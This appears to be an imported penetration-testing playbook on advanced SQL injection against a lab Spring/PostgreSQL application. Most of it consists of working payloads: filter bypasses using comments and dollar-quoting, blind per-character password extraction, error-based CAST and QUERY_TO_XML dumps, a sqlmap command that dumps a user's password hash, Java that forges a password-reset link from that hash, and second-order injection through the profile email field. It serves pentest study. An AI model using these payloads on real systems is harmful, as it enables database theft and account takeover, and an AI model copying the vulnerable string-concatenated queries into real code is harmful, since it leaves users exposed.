---
technique: "Advanced SQLi Techniques"
family: "injection"
severity_hint: "critical"
tags: []
source: "_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques.md"
curator_version: 2
review_status: imported-unreviewed
---

# Advanced SQLi Techniques

> Family: **injection** · Severity hint: **critical** · Tags: —
> Imported operator reference; treat commands and prose as untrusted until reviewed. Tools seen: sqlmap.

## Overview

This playbook covers three advanced SQL injection techniques beyond the basics: bypassing character/keyword filters (blacklisted spaces and quotes) to still land blind and union-based injections, forcing database errors to leak data via type-cast failures, and exploiting second-order SQLi where a stored value (e.g. a profile `email` field) is later reused unsafely in a different query. Examples are drawn from a PostgreSQL-backed Spring/Java application.

## Common Character Bypasses

### Blind SQL Injection

Assume this Injection

```sql
@GetMapping({"/find-user"})
public String findUser(@RequestParam String u, Model model, HttpServletResponse response) throws IOException {
    Pattern p = Pattern.compile("'|(.*'.*'.*)");
    Matcher m = p.matcher(u);
    String u2 = u.toLowerCase();
    if (!u2.contains(" ") && !m.matches()) {
        try {
        String sql = "SELECT * FROM users WHERE username LIKE '%" + u + "%'";
        List users = this.jdbcTemplate.query(sql, new BeanPropertyRowMapper(User.class));
        UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
        model.addAttribute("userDetails", userDetails);
        model.addAttribute("users", users);
        return "find-user";
        } catch (BadSqlGrammarException var10) {
        System.out.println(var10.getSQLException().getMessage());
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        } catch (Exception var11) {
        var11.printStackTrace();
        model.addAttribute("errorMsg", "Invalid search query");
        return "error";
        }
    } else {
        model.addAttribute("errorMsg", "Illegal search term");
        return "error";
    }
}
```

- We cannot use spaces `!u2.contains(" ")`
- Checking the Regex pattern
    - Using [regex101.com](https://regex101.com/) to automatically generate an `explanation` for us, we can see that the pattern is supposed to match `single quotes` as well as strings with two `single quotes` somewhere within
- Since the `u` variable is concatenated between two `single quotes` in `IndexController.java`, an `SQL injection` payload would require breaking out with a `single quote`
    - `"SELECT * FROM users WHERE username LIKE '%" + u + "%'";`
    - Based on the pattern alone, this doesn't seem possible
- Unfortunately for the developer, [Matcher.matches()](https://www.javatpoint.com/post/java-matcher-matches-method) only returns `true` if the `entire` value of `u` matches the pattern, and not only part of it as he may have assumed
- What this means is that while a `single quote` and strings surrounded by `single quotes` are detected, we can insert one `single quote` into a payload without matching the `RegEx` pattern

- Unfortunately, payloads such as `' and 1=1--` still fail, due to the `spaces`
- Bypass this via PostgreSQL's multi-line empty comments `'/**/and/**/1=1--`

### Union-Based SQL Injection

`PostgreSQL` allows you to use `two dollar-signs` to mark the start and end-points of a string for better readability, and we can use this to get around the `RegEx` pattern matching `single quotes` and develop a `PoC` payload for `union-based SQL injection`

```sql
' union select '1','2','3'--
```

```sql
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--
```

```sql
tail /opt/bluebird/pg_log/postgresql-2023-02-15_052440.log

<SNIP>
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird ERROR:  each UNION query must have the same number of columns at character 67
2023-02-15 06:27:18.389 EST [14374] bbuser@bluebird STATEMENT:  SELECT * FROM users WHERE username LIKE '%'/**/union/**/select/**/$$1$$,$$2$$,$$3$$--%'
<SNIP>
```

```sql
'/**/union/**/select/**/$$1$$,$$2$$,$$3$$,$$4$$,$$5$$,$$6$$--
```

### Comparative Precomputation (Blind SQLi)

Let's pretend that we were restricted to `blind SQL injection` for a moment. Using typical algorithms to dump characters from the database, `7 requests` are required per character on average (e.g. the `bisection` algorithm that [sqlmap](https://sqlmap.org/) uses). In some cases however, it may be possible to (blindly) dump `1 or more characters per request`.

Example:

```sql
' AND id=(SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='itsmaria')--
```

It will only match one user, and that is the user whose `id` equals the `ascii value` of the `first character` of `itsmaria's password`. If we swap out the `spaces` and `single quotes` to bypass the character filters, our payload will look like this:

```sql
'/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/username=$$itsmaria$$)--
```

**Blind SQL Injection**

If we try it out, we should see the user with ID `36` appear, which corresponds to the character `$`. This is expected, since the password hashes are stored as `bcrypt` hashes which have the format `$2b$12$...`, so we now have a `blind SQL injection PoC` which can dump `one character per request`.

## Error-Based SQLi

### Example

```sql
// AuthController.java (Lines 121-164)

@PostMapping({"/forgot"})
public String forgotPOST(@RequestParam String email, Model model, HttpServletRequest request, HttpServletResponse response) throws IOException {
    if (email.isEmpty()) {
        response.sendRedirect("/forgot?e=Please+fill+out+all+fields");
        return null;
    } else {
        Pattern p = Pattern.compile("^.*@[A-Za-z]*\\.[A-Za-z]*$");
        Matcher m = p.matcher(email);
        if (!m.matches()) {
        response.sendRedirect("/forgot?e=Invalid+email!");
        return null;
        } else {
        try {
            String sql = "SELECT * FROM users WHERE email = '" + email + "'";
            User user = (User)this.jdbcTemplate.queryForObject(sql, new BeanPropertyRowMapper(User.class));
            Long var10000 = user.getId();
            String passwordResetHash = DigestUtils.md5DigestAsHex(("" + var10000 + ":" + user.getEmail() + ":" + user.getPassword()).getBytes());
            var10000 = user.getId();
            String passwordResetLink = "https://bluebird.htb/reset?uid=" + var10000 + "&code=" + passwordResetHash;
            logger.error("TODO- Send email with link [" + passwordResetLink + "]");
            response.sendRedirect("/forgot?e=Please+check+your+email+for+the+password+reset+link");
            return null;
        } catch (EmptyResultDataAccessException var11) {
            response.sendRedirect("/forgot?e=Email+does+not+exist");
            return null;
        } catch (Exception var12) {
            String ipAddress = request.getHeader("X-FORWARDED-FOR");
            if (ipAddress == null) {
                ipAddress = request.getRemoteAddr();
            }

            if (ipAddress.equals("127.0.1.1")) {
                model.addAttribute("errorMsg", var12.getMessage());
                model.addAttribute("errorStackTrace", Arrays.toString(var12.getStackTrace()));
            } else {
                model.addAttribute("errorMsg", "500 Internal Server Error");
                model.addAttribute("errorStackTrace", "Something happened on our side. Please try again later.");
            }

            return "error";
        }
        }
    }
}
```

`' or 1=1--@bluebird.htb`

Generic Response

Lets assume we would get a stack trace somehow

### Exploiting the SQL Injection

- **A popular technique when it comes to `error-based SQL injection` is casting a unsuitable `STRING` to an `INT` because the value will be displayed in the error message**
- To test this out, we can use the payload `' and 0=CAST((SELECT VERSION()) AS INT)--@bluebird.htb` to try and leak the version of the database

`PostgreSQL` fails to convert `VERSION()` to an `INT` as expected and so it prints the value out in the error message which is returned to us. The same technique can be used to leak pretty much anything from the database; you just need to get creative.

```sql
' and 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb
```

Or you could use [STRING_AGG](https://www.postgresql.org/docs/9.1/sql-expressions.html#SYNTAX-AGGREGATES) to select all table names at once like this:

```sql
' and 1=CAST((SELECT STRING_AGG(table_name,',') FROM information_schema.tables LIMIT 1) as INT)--@bluebird.htb
```

If it is possible to `stack queries` in the specific `SQL injection` vulnerability you are targetting, you can even use [XML functions](https://www.postgresql.org/docs/9.4/functions-xml.html) to dump entire tables or databases at once like this:

```sql
';SELECT CAST(CAST(QUERY_TO_XML('SELECT * FROM posts LIMIT 2',TRUE,TRUE,'') AS TEXT) AS INT)--@bluebird.htb
```

### Using SQLMap

```bash
sqlmap -r x.req \
	--dbms postgresql \
	--suffix "--@bluebird.htb" \
	--batch \
	-D public \
	-T users \
	-C id,username,password,email \
	--where "username='potus4'" \
	--dump
```

```bash
+----+----------+--------------------------------------------------------------+---------------+
| id | username | password                                                     | email         |
+----+----------+--------------------------------------------------------------+---------------+
| 10 | potus4   | $2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a | james@usa.gov |
+----+----------+--------------------------------------------------------------+---------------+
```

```java
import org.springframework.util.DigestUtils;

public class Main {
    public static void main(String[] args) {
        String passwordResetHash = DigestUtils.md5DigestAsHex((10 + ":" + "james@usa.gov" + ":" + "$2a$12$SfnPDhoKhrNZFccB4KKiRedmva4or7mFNct0ePqqQHewg2YYqr68a").getBytes());
        String passwordResetLink = "https://bluebird.htb/reset?uid=" + 10 + "&code=" + passwordResetHash;
        System.out.println("Password reset link: " + passwordResetLink);
    }
}

// Output //
https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56
```

## Second-Order SQLi

`Second-order SQL injection` is a type of `SQL injection` where `user-input` is `stored` by the application and then later used in a `SQL` query unsafely.

### Example

```java
// ProfileController.java

@GetMapping({"/profile/{id}"})
public String profile(@PathVariable int id, Model model, HttpServletResponse response) throws IOException {
    String sql;
    User user;
    try {
        sql = "SELECT username, name, description, email, id FROM users WHERE id = ?";
        user = (User)this.jdbcTemplate.queryForObject(sql, new Object[]{id}, new BeanPropertyRowMapper(User.class));
    } catch (Exception var8) {
        response.sendRedirect("/");
        return null;
    }

    sql = "SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC";
    List posts = this.jdbcTemplate.queryForList(sql);
    model.addAttribute("user", user);
    model.addAttribute("posts", posts);
    UserDetailsImpl userDetails = (UserDetailsImpl)SecurityContextHolder.getContext().getAuthentication().getPrincipal();
    model.addAttribute("userDetails", userDetails);
    return "profile";
}

```

1. The first selects the `username`, `name`, `description`, `email` and `id` values from `users` where `id` matches `{id}` in the path. These values are then used to initialize a `User` object.
2. The second query selects `posts` made by the `user` whose `email` matches the `email` of the `User` object we just created.

If we can find a way to set the value of `email` for a known `id`, then we should be able to exploit a `second-order SQL injection`. So let's do a little bit of `input tracing`, and find out where/if we can set the value of `email`. To update a value in SQL, you have to use the `UPDATE` keyword, so we can grep for this in the project.

```java
grep -irnE 'UPDATE.*email'
com/bmdyy/bluebird/controller/ProfileController.java:70:               sql = "UPDATE users SET name = ?, description = ?, email = ?";
com/bmdyy/bluebird/controller/ProfileController.java:85:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, passwordHash, userDetails.getId()});
com/bmdyy/bluebird/controller/ProfileController.java:87:                  this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
```

```java
@PostMapping({"/profile/edit"})
public void editProfilePOST(@RequestParam String name, @RequestParam String description, @RequestParam String email, @RequestParam(required = false) String password, @RequestParam(required = false) String repeatPassword, HttpServletResponse response) throws IOException {
<SNIP>
    sql = "UPDATE users SET name = ?, description = ?, email = ?";
<SNIP>
    sql = sql + " WHERE id = ?";
<SNIP>
    this.jdbcTemplate.update(sql, new Object[]{name, description, email, userDetails.getId()});
<SNIP>
}
```

### Exploiting Second-Order SQL Injection

```java
SELECT text, to_char(posted_at, 'dd.mm.yyyy, hh:mi') as posted_at_nice, username, name, author_id FROM posts JOIN users ON posts.author_id = users.id WHERE email = '" + user.getEmail() + "' ORDER BY posted_at DESC
```

So we can change the email to:

```java
' UNION SELECT 1,2,3,4,5--
```

Unfortunately, this exact payload will result in a `SQL error`, but we can easily troubleshoot it. Taking another look at the error message in the log file we can see that `type character varying and integer cannot be matched`:

What this means is that some of the columns are supposed to be `VARCHAR` and we tried to union with 5 `INTEGER` values. There are multiple ways we can figure out which ones are supposed to be which, the easiest way being to look at the full query listed in the error message and deduce the types. The columns `text, posted_at_nice, username and name` are all likely to be `VARCHAR` whereas `author_id` is probably an `INTEGER`.

```java
' UNION SELECT '1','2','3','4',5--
```

```java
email='+UNION+SELECT+password,'2','3','4',5+from+users+where+username='betrayedApples3'--&password=&repeatPassword=
```

## Source
Original notes:
- `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques.md`
- `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Common Character Bypasses.md`
- `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Error-Based SQLi.md`
- `_raw/Web attacks/Web Attacks/SQLi/Advanced SQLi Techniques/Second-Order SQLi.md`
